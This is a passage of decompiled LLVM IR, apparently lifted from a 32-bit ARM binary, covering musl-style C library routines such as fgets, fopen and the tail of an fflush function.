  store i32 %v0_eb60, i32* %r6.global-to-local, align 4
  %v0_eb68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_eb68

dec_label_pc_eb68:                                ; preds = %.thread18, %dec_label_pc_eb60
  %v0_eb68 = phi i32 [ %v0_eb68.pre, %dec_label_pc_eb60 ], [ %v0_eb44, %.thread18 ]
  %v1_eb6c = call i32 @__fflush_unlocked(i32 %v0_eb68)
  %v0_eb70 = load i32, i32* %r6.global-to-local, align 4
  %v2_eb70 = icmp eq i32 %v0_eb70, 0
  store i1 %v2_eb70, i1* @cpsr_z, align 1
  store i32 %v1_eb6c, i32* @r5, align 4
  br i1 %v2_eb70, label %dec_label_pc_ec04, label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eb68
  %v0_eb7c = load i32, i32* @r4, align 4
  %v1_eb80 = call i32 @__unlockfile(i32 %v0_eb7c)
  br label %dec_label_pc_ec04

dec_label_pc_eb88:                                ; preds = %entry
  %v2_eb8c = load i32, i32* @global_var_23d1c.557, align 4
  %v2_eb90 = icmp eq i32 %v2_eb8c, 0
  br i1 %v2_eb90, label %dec_label_pc_eb9c, label %bb19

bb19:                                             ; preds = %dec_label_pc_eb88
  store i32 %v2_eb8c, i32* @r0, align 4
  store i32 60316, i32* @lr, align 4
  br label %entry

dec_label_pc_eb9c:                                ; preds = %dec_label_pc_eb88
  store i32 60316, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v0_eba0 = call i32 @__ofl_lock()
  %v1_eba4 = inttoptr i32 %v0_eba0 to i32*
  %v2_eba4 = load i32, i32* %v1_eba4, align 4
  store i32 %v2_eba4, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v2_ebf42 = icmp eq i32 %v2_eba4, 0
  store i32 %v2_eba4, i32* @r0, align 4
  br i1 %v2_ebf42, label %dec_label_pc_ec00, label %dec_label_pc_ebb0

dec_label_pc_ebb0:                                ; preds = %dec_label_pc_eb9c, %dec_label_pc_ebf4
  %v0_ebb0 = phi i32 [ %v3_ebf0, %dec_label_pc_ebf4 ], [ %v2_eba4, %dec_label_pc_eb9c ]
  %v1_ebb0 = add i32 %v0_ebb0, 76
  %v2_ebb0 = inttoptr i32 %v1_ebb0 to i32*
  %v3_ebb0 = load i32, i32* %v2_ebb0, align 4
  %v1_ebb4 = icmp slt i32 %v3_ebb0, 0
  br i1 %v1_ebb4, label %.thread, label %dec_label_pc_ebc0

.thread:                                          ; preds = %dec_label_pc_ebb0
  %v3_ebb8 = load i32, i32* @r7, align 4
  store i32 %v3_ebb8, i32* @r6, align 4
  br label %dec_label_pc_ebc8

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ebb0
  %v0_ebc0 = call i32 @__lockfile()
  store i32 %v0_ebc0, i32* @r6, align 4
  %v0_ebc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ebc8

dec_label_pc_ebc8:                                ; preds = %.thread, %dec_label_pc_ebc0
  %v0_ebe424 = phi i32 [ %v0_ebc0, %dec_label_pc_ebc0 ], [ %v3_ebb8, %.thread ]
  %v0_ebd8 = phi i32 [ %v0_ebc8.pre, %dec_label_pc_ebc0 ], [ %v0_ebb0, %.thread ]
  %v1_ebc8 = add i32 %v0_ebd8, 20
  %v2_ebc8 = inttoptr i32 %v1_ebc8 to i32*
  %v3_ebc8 = load i32, i32* %v2_ebc8, align 4
  store i32 %v3_ebc8, i32* @r2, align 4
  %v1_ebcc = add i32 %v0_ebd8, 28
  %v2_ebcc = inttoptr i32 %v1_ebcc to i32*
  %v3_ebcc = load i32, i32* %v2_ebcc, align 4
  %tmp = icmp ugt i32 %v3_ebc8, %v3_ebcc
  br i1 %tmp, label %dec_label_pc_ebd8, label %dec_label_pc_ebe4

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebc8
  %v1_ebdc = call i32 @__fflush_unlocked(i32 %v0_ebd8)
  %v0_ebe0 = load i32, i32* @r5, align 4
  %v2_ebe0 = or i32 %v0_ebe0, %v1_ebdc
  store i32 %v2_ebe0, i32* @r5, align 4
  %v0_ebe4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_ebc8, %dec_label_pc_ebd8
  %v0_ebe4 = phi i32 [ %v0_ebe424, %dec_label_pc_ebc8 ], [ %v0_ebe4.pre, %dec_label_pc_ebd8 ]
  %v2_ebe4 = icmp eq i32 %v0_ebe4, 0
  br i1 %v2_ebe4, label %dec_label_pc_ebf4, label %bb20

bb20:                                             ; preds = %dec_label_pc_ebe4
  br label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebe4, %bb20
  store i32 60400, i32* @lr, align 4
  %v1_ebec = xor i1 %v2_ebe4, true
  call void @__pseudo_cond_branch(i1 %v1_ebec, i32 ptrtoint (i32* @global_var_12da8.554 to i32))
  %v0_ebf0 = load i32, i32* @r4, align 4
  %v1_ebf0 = add i32 %v0_ebf0, 56
  %v2_ebf0 = inttoptr i32 %v1_ebf0 to i32*
  %v3_ebf0 = load i32, i32* %v2_ebf0, align 4
  store i32 %v3_ebf0, i32* @r4, align 4
  %v2_ebf4 = icmp eq i32 %v3_ebf0, 0
  store i32 %v3_ebf0, i32* @r0, align 4
  br i1 %v2_ebf4, label %dec_label_pc_ec00, label %dec_label_pc_ebb0

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebf4, %dec_label_pc_eb9c
  %v0_ec00 = call i32 @__ofl_unlock()
  br label %dec_label_pc_ec04

dec_label_pc_ec04:                                ; preds = %dec_label_pc_eb68, %dec_label_pc_eb7c, %dec_label_pc_ec00
  %v0_ec04 = load i32, i32* @r5, align 4
  %v0_ec08 = load i32, i32* @sp, align 4
  %v1_ec08 = add i32 %v0_ec08, 4
  %v1_ec0c = inttoptr i32 %v1_ec08 to i32*
  %v2_ec0c = load i32, i32* %v1_ec0c, align 4
  store i32 %v2_ec0c, i32* @r4, align 4
  %v6_ec0c = add i32 %v0_ec08, 12
  %v7_ec0c = inttoptr i32 %v6_ec0c to i32*
  %v8_ec0c = load i32, i32* %v7_ec0c, align 4
  store i32 %v8_ec0c, i32* %r6.global-to-local, align 4
  %v9_ec0c = add i32 %v0_ec08, 16
  %v10_ec0c = inttoptr i32 %v9_ec0c to i32*
  %v11_ec0c = load i32, i32* %v10_ec0c, align 4
  store i32 %v11_ec0c, i32* @r7, align 4
  ret i32 %v0_ec04

; uselistorder directives
  uselistorder i32 %v3_ebf0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_ebd8, { 0, 2, 1 }
  uselistorder i32 %v0_eb44, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eb40, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__fflush_unlocked, { 1, 0 }
  uselistorder label %dec_label_pc_ec04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ebf4, { 1, 0 }
  uselistorder label %dec_label_pc_ebe4, { 1, 0 }
  uselistorder label %dec_label_pc_ebc8, { 1, 0 }
  uselistorder label %dec_label_pc_ebb0, { 1, 0 }
  uselistorder label %dec_label_pc_eb68, { 1, 0 }
}

define i32 @fgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ec18 = load i32, i32* @r4, align 4
  store i32 %v3_ec18, i32* %stack_var_-32, align 4
  %v6_ec18 = load i32, i32* @r5, align 4
  %v9_ec18 = load i32, i32* @r6, align 4
  %v12_ec18 = load i32, i32* @r7, align 4
  %v15_ec18 = load i32, i32* @r8, align 4
  %v18_ec18 = load i32, i32* @sb, align 4
  %v21_ec18 = load i32, i32* @sl, align 4
  %v1_ec1c = add i32 %arg3, 76
  %v2_ec1c = inttoptr i32 %v1_ec1c to i32*
  %v3_ec1c = load i32, i32* %v2_ec1c, align 4
  %v1_ec20 = icmp slt i32 %v3_ec1c, 0
  %v2_ec20 = icmp eq i32 %v3_ec1c, 0
  store i1 %v2_ec20, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r4, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v1_ec20, label %.thread24, label %dec_label_pc_ec38

.thread24:                                        ; preds = %entry
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_ec44

dec_label_pc_ec38:                                ; preds = %entry
  store i32 %arg3, i32* @r0, align 4
  %v0_ec3c = call i32 @__lockfile()
  store i32 %v0_ec3c, i32* %r0.global-to-local, align 4
  store i32 %v0_ec3c, i32* @sb, align 4
  %v0_ec44.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ec44

dec_label_pc_ec44:                                ; preds = %.thread24, %dec_label_pc_ec38
  %v0_ec60 = phi i32 [ %v0_ec3c, %dec_label_pc_ec38 ], [ 0, %.thread24 ]
  %v0_ec48 = phi i32 [ %v0_ec44.pre, %dec_label_pc_ec38 ], [ %arg2, %.thread24 ]
  %v1_ec44 = add i32 %v0_ec48, -1
  %v7_ec44 = icmp eq i32 %v0_ec48, 1
  store i1 %v7_ec44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ec44, i32* @r6, align 4
  %v7_ec4c = icmp sgt i32 %v0_ec48, 1
  br i1 %v7_ec4c, label %.thread, label %dec_label_pc_ec54

.thread:                                          ; preds = %dec_label_pc_ec44
  %v8_ec4c = load i32, i32* @r8, align 4
  store i32 %v8_ec4c, i32* @r7, align 4
  %v2_ed449 = icmp eq i32 %v1_ec44, 0
  store i1 %v2_ed449, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %r1.global-to-local, align 4
  br i1 %v2_ed449, label %dec_label_pc_ed50, label %dec_label_pc_ec80

dec_label_pc_ec54:                                ; preds = %dec_label_pc_ec44
  %v0_ec54 = load i32, i32* @r4, align 4
  %v1_ec54 = add i32 %v0_ec54, 74
  %v2_ec54 = inttoptr i32 %v1_ec54 to i8*
  %v3_ec54 = load i8, i8* %v2_ec54, align 1
  %v4_ec54 = zext i8 %v3_ec54 to i32
  store i32 %v4_ec54, i32* @r2, align 4
  %v1_ec58 = add i8 %v3_ec54, -1
  %v2_ec5c = or i8 %v1_ec58, %v3_ec54
  %v2_ec60 = icmp eq i32 %v0_ec60, 0
  store i1 %v2_ec60, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_ec5c, i8* %v2_ec54, align 1
  %v0_ec68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec68, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_ec54
  %v1_ec68 = load i32, i32* @r4, align 4
  store i32 %v1_ec68, i32* %r0.global-to-local, align 4
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_ec54, %bb
  %v1_ec6c = xor i1 %v0_ec68, true
  call void @__pseudo_cond_branch(i1 %v1_ec6c, i32 ptrtoint (i32* @global_var_12da8.554 to i32))
  %v0_ec70 = load i32, i32* @r6, align 4
  %v2_ec70 = icmp eq i32 %v0_ec70, 0
  store i1 %v2_ec70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec70, label %.thread1, label %bb36

bb36:                                             ; preds = %bb35
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_ed70

.thread1:                                         ; preds = %bb35
  %v3_ec78.pre = load i32, i32* @r8, align 4
  %phitmp = inttoptr i32 %v3_ec78.pre to i8*
  store i8 0, i8* %phitmp, align 1
  br label %dec_label_pc_ed70

dec_label_pc_ec80:                                ; preds = %.thread, %dec_label_pc_ed40
  %v0_ec80 = load i32, i32* @r4, align 4
  %v1_ec80 = add i32 %v0_ec80, 4
  %v2_ec80 = inttoptr i32 %v1_ec80 to i32*
  %v3_ec80 = load i32, i32* %v2_ec80, align 4
  store i32 %v3_ec80, i32* %r0.global-to-local, align 4
  %v4_ec80 = add i32 %v0_ec80, 8
  %v5_ec80 = inttoptr i32 %v4_ec80 to i32*
  %v6_ec80 = load i32, i32* %v5_ec80, align 4
  %v2_ec84 = sub i32 %v6_ec80, %v3_ec80
  %v3_ec88 = inttoptr i32 %v3_ec80 to i8*
  %v4_ec88 = call i32 @memchr(i8* %v3_ec88, i32 10, i32 %v2_ec84)
  store i32 %v4_ec88, i32* %r0.global-to-local, align 4
  %v0_ec8c = load i32, i32* @r4, align 4
  %v1_ec8c = add i32 %v0_ec8c, 4
  %v2_ec8c = inttoptr i32 %v1_ec8c to i32*
  %v3_ec8c = load i32, i32* %v2_ec8c, align 4
  store i32 %v3_ec8c, i32* %r1.global-to-local, align 4
  store i32 %v4_ec88, i32* @sl, align 4
  %v2_ec90 = icmp eq i32 %v4_ec88, 0
  store i1 %v2_ec90, i1* %cpsr_z.global-to-local, align 1
  %v1_ec94 = sub i32 1, %v3_ec8c
  store i32 %v1_ec94, i32* @r3, align 4
  %v2_ec98 = add i32 %v1_ec94, %v4_ec88
  br i1 %v2_ec90, label %bb37, label %.thread2

bb37:                                             ; preds = %dec_label_pc_ec80
  %v2_ec9c = add i32 %v0_ec8c, 8
  %v3_ec9c = inttoptr i32 %v2_ec9c to i32*
  %v4_ec9c = load i32, i32* %v3_ec9c, align 4
  store i32 %v4_ec9c, i32* @r3, align 4
  %v3_eca0 = sub i32 %v4_ec9c, %v3_ec8c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ec80, %bb37
  %v1_eca8 = phi i32 [ %v2_ec98, %dec_label_pc_ec80 ], [ %v3_eca0, %bb37 ]
  %v1_eca4 = load i32, i32* @r6, align 4
  %v3_eca4 = icmp uge i32 %v1_eca8, %v1_eca4
  %v9_eca4 = icmp eq i32 %v1_eca8, %v1_eca4
  store i1 %v9_eca4, i1* %cpsr_z.global-to-local, align 1
  %v1_eca4.v1_eca8 = select i1 %v3_eca4, i32 %v1_eca4, i32 %v1_eca8
  store i32 %v1_eca4.v1_eca8, i32* @r5, align 4
  %v3_ecb0 = load i32, i32* %v2_ec8c, align 4
  store i32 %v3_ecb0, i32* %r1.global-to-local, align 4
  %v0_ecb8 = load i32, i32* @r7, align 4
  store i32 %v0_ecb8, i32* %r0.global-to-local, align 4
  %tmp40 = inttoptr i32 %v0_ecb8 to i16*
  %v5_ecbc = call i32 @memcpy(i16* %tmp40, i32 %v3_ecb0, i32 %v1_eca4.v1_eca8)
  store i32 %v5_ecbc, i32* %r0.global-to-local, align 4
  %v0_ecc0 = load i32, i32* @r6, align 4
  %v1_ecc0 = load i32, i32* @r5, align 4
  %v9_ecc0 = icmp eq i32 %v0_ecc0, %v1_ecc0
  %storemerge25 = zext i1 %v9_ecc0 to i32
  %v0_eccc = load i32, i32* @r4, align 4
  %v1_eccc = add i32 %v0_eccc, 4
  %v2_eccc = inttoptr i32 %v1_eccc to i32*
  %v3_eccc = load i32, i32* %v2_eccc, align 4
  store i32 %v3_eccc, i32* %r0.global-to-local, align 4
  %v0_ecd0 = load i32, i32* @sl, align 4
  %v2_ecd0 = icmp eq i32 %v0_ecd0, 0
  store i1 %v2_ecd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ecd0, label %bb44, label %bb43

bb43:                                             ; preds = %.thread2
  br label %bb44

bb44:                                             ; preds = %.thread2, %bb43
  %v0_ecdc = phi i32 [ %storemerge25, %.thread2 ], [ 1, %bb43 ]
  %v2_ecd8 = add i32 %v3_eccc, %v1_ecc0
  store i32 %v2_ecd8, i32* @r2, align 4
  %v2_ecdc = icmp eq i32 %v0_ecdc, 0
  store i1 %v2_ecdc, i1* %cpsr_z.global-to-local, align 1
  %v1_ece0 = add i32 %v2_ecd8, 1
  store i32 %v1_ece0, i32* %r1.global-to-local, align 4
  store i32 %v2_ecd8, i32* %v2_eccc, align 4
  %v0_ece8 = load i32, i32* @r7, align 4
  %v1_ece8 = load i32, i32* @r5, align 4
  %v2_ece8 = add i32 %v1_ece8, %v0_ece8
  store i32 %v2_ece8, i32* %r7.global-to-local, align 4
  %v1_ecec = load i32, i32* @r6, align 4
  %v2_ecec = sub i32 %v1_ecec, %v1_ece8
  store i32 %v2_ecec, i32* %r6.global-to-local, align 4
  br i1 %v2_ecdc, label %dec_label_pc_ecf4, label %dec_label_pc_ed50.loopexit.loopexit

dec_label_pc_ecf4:                                ; preds = %bb44
  %v0_ecf4 = load i32, i32* @r4, align 4
  %v1_ecf4 = add i32 %v0_ecf4, 8
  %v2_ecf4 = inttoptr i32 %v1_ecf4 to i32*
  %v3_ecf4 = load i32, i32* %v2_ecf4, align 4
  %v0_ecf8 = load i32, i32* @r2, align 4
  %v3_ecf8 = icmp ult i32 %v0_ecf8, %v3_ecf4
  %v9_ecf8 = icmp eq i32 %v0_ecf8, %v3_ecf4
  store i1 %v9_ecf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ecf8, label %.thread5.dec_label_pc_ed30_crit_edge, label %dec_label_pc_ed08

.thread5.dec_label_pc_ed30_crit_edge:             ; preds = %dec_label_pc_ecf4
  %v1_ecfc = load i32, i32* %r0.global-to-local, align 4
  %v3_ecfc = add i32 %v1_ecfc, %v1_ece8
  %v4_ecfc = inttoptr i32 %v3_ecfc to i8*
  %v5_ecfc = load i8, i8* %v4_ecfc, align 1
  %v7_ecfc = zext i8 %v5_ecfc to i32
  store i32 %v7_ecfc, i32* %r0.global-to-local, align 4
  %v1_ed00 = load i32, i32* %r1.global-to-local, align 4
  %v3_ed00 = add i32 %v0_ecf4, 4
  %v4_ed00 = inttoptr i32 %v3_ed00 to i32*
  store i32 %v1_ed00, i32* %v4_ed00, align 4
  %v0_ed30.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed30

dec_label_pc_ed08:                                ; preds = %dec_label_pc_ecf4
  store i32 %v0_ecf4, i32* %r0.global-to-local, align 4
  %v1_ed0c = call i32 @__uflow(i32 %v0_ecf4)
  store i32 %v1_ed0c, i32* %r0.global-to-local, align 4
  %v1_ed10 = icmp slt i32 %v1_ed0c, 0
  %v2_ed10 = icmp eq i32 %v1_ed0c, 0
  store i1 %v2_ed10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_ed10, label %dec_label_pc_ed18, label %dec_label_pc_ed30

dec_label_pc_ed18:                                ; preds = %dec_label_pc_ed08
  %v0_ed18 = load i32, i32* %r7.global-to-local, align 4
  %v1_ed18 = load i32, i32* @r8, align 4
  %v9_ed18 = icmp eq i32 %v0_ed18, %v1_ed18
  store i1 %v9_ed18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ed18, label %dec_label_pc_ed60, label %dec_label_pc_ed20

dec_label_pc_ed20:                                ; preds = %dec_label_pc_ed18
  %v0_ed20 = load i32, i32* @r4, align 4
  %v1_ed20 = inttoptr i32 %v0_ed20 to i32*
  %v2_ed20 = load i32, i32* %v1_ed20, align 4
  %v1_ed24 = and i32 %v2_ed20, 16
  %v2_ed24 = icmp eq i32 %v1_ed24, 0
  store i1 %v2_ed24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed24, label %dec_label_pc_ed60, label %dec_label_pc_ed50

dec_label_pc_ed30:                                ; preds = %.thread5.dec_label_pc_ed30_crit_edge, %dec_label_pc_ed08
  %v0_ed30 = phi i32 [ %v0_ed30.pre, %.thread5.dec_label_pc_ed30_crit_edge ], [ %v1_ed0c, %dec_label_pc_ed08 ]
  %v1_ed30 = urem i32 %v0_ed30, 256
  %v7_ed34 = icmp eq i32 %v1_ed30, 10
  store i1 %v7_ed34, i1* %cpsr_z.global-to-local, align 1
  %v1_ed38 = trunc i32 %v0_ed30 to i8
  %v2_ed38 = load i32, i32* %r7.global-to-local, align 4
  %v3_ed38 = inttoptr i32 %v2_ed38 to i8*
  store i8 %v1_ed38, i8* %v3_ed38, align 1
  %v4_ed38 = load i32, i32* %r7.global-to-local, align 4
  %v5_ed38 = add i32 %v4_ed38, 1
  store i32 %v5_ed38, i32* @r7, align 4
  %v0_ed3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ed3c, label %dec_label_pc_ed50.loopexit.loopexit, label %dec_label_pc_ed40

dec_label_pc_ed40:                                ; preds = %dec_label_pc_ed30
  %v0_ed40 = load i32, i32* %r6.global-to-local, align 4
  %v1_ed40 = add i32 %v0_ed40, -1
  store i32 %v1_ed40, i32* @r6, align 4
  %v2_ed44 = icmp eq i32 %v1_ed40, 0
  store i1 %v2_ed44, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %r1.global-to-local, align 4
  br i1 %v2_ed44, label %dec_label_pc_ed50.loopexit.loopexit, label %dec_label_pc_ec80

dec_label_pc_ed50.loopexit.loopexit:              ; preds = %dec_label_pc_ed30, %dec_label_pc_ed40, %bb44
  %v3_ed5822.ph = phi i32 [ %v2_ece8, %bb44 ], [ %v5_ed38, %dec_label_pc_ed40 ], [ %v5_ed38, %dec_label_pc_ed30 ]
  %v0_ed50.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_ed50

dec_label_pc_ed50:                                ; preds = %.thread, %dec_label_pc_ed50.loopexit.loopexit, %dec_label_pc_ed20
  %v3_ed58 = phi i32 [ %v0_ed18, %dec_label_pc_ed20 ], [ %v8_ec4c, %.thread ], [ %v3_ed5822.ph, %dec_label_pc_ed50.loopexit.loopexit ]
  %v0_ed50 = phi i32 [ %v1_ed18, %dec_label_pc_ed20 ], [ %v8_ec4c, %.thread ], [ %v0_ed50.pre.pre, %dec_label_pc_ed50.loopexit.loopexit ]
  %v2_ed50 = icmp eq i32 %v0_ed50, 0
  store i1 %v2_ed50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed50, label %dec_label_pc_ed64, label %bb45

bb45:                                             ; preds = %dec_label_pc_ed50
  %v4_ed58 = inttoptr i32 %v3_ed58 to i8*
  store i8 0, i8* %v4_ed58, align 1
  br label %dec_label_pc_ed64

dec_label_pc_ed60:                                ; preds = %dec_label_pc_ed20, %dec_label_pc_ed18
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_ed64

dec_label_pc_ed64:                                ; preds = %dec_label_pc_ed50, %bb45, %dec_label_pc_ed60
  %v0_ed64 = load i32, i32* @sb, align 4
  %v2_ed64 = icmp eq i32 %v0_ed64, 0
  store i1 %v2_ed64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed64, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_ed64
  %v1_ed68 = load i32, i32* @r4, align 4
  store i32 %v1_ed68, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_ed64, %bb46
  %v1_ed6c = xor i1 %v2_ed64, true
  call void @__pseudo_cond_branch(i1 %v1_ed6c, i32 ptrtoint (i32* @global_var_12da8.554 to i32))
  br label %dec_label_pc_ed70

dec_label_pc_ed70:                                ; preds = %bb36, %.thread1, %bb47
  %v0_ed70 = load i32, i32* @r8, align 4
  store i32 %v0_ed70, i32* %r0.global-to-local, align 4
  %v2_ed74 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_ed74, i32* @r4, align 4
  store i32 %v6_ec18, i32* @r5, align 4
  store i32 %v9_ec18, i32* @r6, align 4
  store i32 %v12_ec18, i32* @r7, align 4
  store i32 %v15_ec18, i32* @r8, align 4
  store i32 %v18_ec18, i32* @sb, align 4
  store i32 %v21_ec18, i32* @sl, align 4
  ret i32 %v0_ed70

; uselistorder directives
  uselistorder i32 %v0_ed30, { 1, 0 }
  uselistorder i32 %v0_ecf8, { 1, 0 }
  uselistorder i32 %v1_ece8, { 0, 2, 1 }
  uselistorder i32 %v2_ecd8, { 1, 0, 2 }
  uselistorder i32 %v1_eca4, { 0, 2, 1 }
  uselistorder i32 %v0_ec48, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 6, 2, 3, 4, 5, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 10, 9, 13, 11, 12, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 13, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 0, 17, 18 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ed70, { 2, 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_ed64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ed50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ed50.loopexit.loopexit, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ed30, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_ec80, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_ec44, { 1, 0 }
}

define i32 @___syscall3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %v3_ed9c = load i32, i32* @r4, align 4
  %v6_ed9c = load i32, i32* @r5, align 4
  %v9_ed9c = load i32, i32* @r6, align 4
  %v12_ed9c = load i32, i32* @r7, align 4
  %v15_ed9c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  %v3_edac = load i8, i8* %arg2, align 1
  %v4_edac = zext i8 %v3_edac to i32
  store i32 ptrtoint ([4 x i8]* @global_var_19d6c.560 to i32), i32* @r0, align 4
  %v3_edb4 = call i32 @strchr(i32 ptrtoint ([4 x i8]* @global_var_19d6c.560 to i32), i32 %v4_edac)
  store i32 %v3_edb4, i32* %r7.global-to-local, align 4
  %v2_edb8 = icmp eq i32 %v3_edb4, 0
  br i1 %v2_edb8, label %dec_label_pc_edc0, label %dec_label_pc_edd4

dec_label_pc_edc0:                                ; preds = %entry
  %v0_edc0 = call i32 @__errno_location()
  %v0_edc8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_edc8, i32* %r2.global-to-local, align 4
  %v2_edcc = inttoptr i32 %v0_edc0 to i32*
  store i32 22, i32* %v2_edcc, align 4
  %v0_ee3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ee3c

dec_label_pc_edd4:                                ; preds = %entry
  %v0_edd4 = load i32, i32* @r4, align 4
  %v1_edd4 = inttoptr i32 %v0_edd4 to i8*
  %v3_edd8 = call i32 @__fmodeflags(i8* %v1_edd4)
  %v0_eddc = load i32, i32* @r6, align 4
  %v1_ede0 = or i32 %v3_edd8, 131072
  store i32 %v1_ede0, i32* %r2.global-to-local, align 4
  store i32 %v3_edd8, i32* @r5, align 4
  %v4_edf0 = call i32 @___syscall3(i32 5, i32 %v0_eddc, i32 %v1_ede0, i32 438)
  store i32 %v4_edf0, i32* @r0, align 4
  %v0_edf4 = call i32 @__syscall_ret()
  store i32 %v0_edf4, i32* @r7, align 4
  %v1_edf8 = icmp slt i32 %v0_edf4, 0
  br i1 %v1_edf8, label %.thread3, label %dec_label_pc_ee04

.thread3:                                         ; preds = %dec_label_pc_edd4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ee3c

dec_label_pc_ee04:                                ; preds = %dec_label_pc_edd4
  %v0_ee04 = load i32, i32* @r5, align 4
  %v1_ee04 = and i32 %v0_ee04, 524288
  %v2_ee04 = icmp eq i32 %v1_ee04, 0
  br i1 %v2_ee04, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_ee04
  store i32 2, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ee04, %bb
  store i32 60956, i32* @lr, align 4
  %v1_ee18 = xor i1 %v2_ee04, true
  call void @__pseudo_cond_branch(i1 %v1_ee18, i32 ptrtoint (i32* @global_var_ed7c.562 to i32))
  %v0_ee1c = load i32, i32* @r4, align 4
  %v1_ee1c = inttoptr i32 %v0_ee1c to i8*
  %v0_ee20 = load i32, i32* @r7, align 4
  %v4_ee24 = call i32 @__fdopen(i32 %v0_ee20, i8* %v1_ee1c)
  store i32 %v4_ee24, i32* %r2.global-to-local, align 4
  %v2_ee28 = icmp eq i32 %v4_ee24, 0
  br i1 %v2_ee28, label %dec_label_pc_ee30, label %dec_label_pc_ee3c

dec_label_pc_ee30:                                ; preds = %.thread2
  store i32 6, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ee3c

dec_label_pc_ee3c:                                ; preds = %.thread3, %.thread2, %dec_label_pc_ee30, %dec_label_pc_edc0
  %v0_ee3c = phi i32 [ 0, %.thread3 ], [ %v4_ee24, %.thread2 ], [ 0, %dec_label_pc_ee30 ], [ %v0_ee3c.pre, %dec_label_pc_edc0 ]
  store i32 %v3_ed9c, i32* @r4, align 4
  store i32 %v6_ed9c, i32* @r5, align 4
  store i32 %v9_ed9c, i32* @r6, align 4
  store i32 %v12_ed9c, i32* @r7, align 4
  store i32 %v15_ed9c, i32* @lr, align 4
  ret i32 %v0_ee3c

; uselistorder directives
  uselistorder label %dec_label_pc_ee3c, { 2, 1, 0, 3 }
  uselistorder label %.thread2, { 1, 0 }
}

